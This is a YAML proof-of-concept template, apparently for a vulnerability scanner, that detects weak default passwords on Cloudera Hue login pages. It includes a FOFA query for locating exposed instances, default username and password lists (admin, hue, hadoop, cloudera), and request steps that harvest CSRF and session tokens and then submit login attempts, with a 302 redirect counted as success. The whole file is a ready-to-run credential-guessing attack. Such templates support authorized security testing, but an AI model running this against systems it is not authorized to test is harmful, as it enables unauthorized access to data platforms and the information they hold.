id: poc-yaml-cloudera-hue-weak-password
info:
  name: Cloudera Hue 弱口令漏洞
  severity: high
  tags:
  - 弱口令
  finger: hue
  fofa: body="Hue - Welcome to Hue"
variables:
  users: 'admin

    hue

    hadoop

    cloudera

    '
  password: 'admin

    hue

    hadoop

    cloudera

    '
firstRequest:
  method: GET
  path: /hue/accounts/login?next=/
  expression: contains(body,"Welcome to Hue")
  output:
  - regex_match(headers,"csrftoken=(?P<csrftoken>.*?);")
  - regex_match(headers,"sessionid=(?P<sessionid>.*?);")
  - regex_match(body,"name='csrfmiddlewaretoken' value='(?P<csrfmiddlewaretoken>.*?)'")
requests:
- method: POST
  path: /hue/accounts/login
  headers:
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    Cookie: csrftoken={{.csrftoken}}; sessionid={{.sessionid}}
  data: csrfmiddlewaretoken={{.csrfmiddlewaretoken}}&username={{.users}}&password={{.password}}&next=%2F
  expression: status_code == 302 && contains(headers,"csrftoken=") && contains(headers,"sessionid=")
transport: http
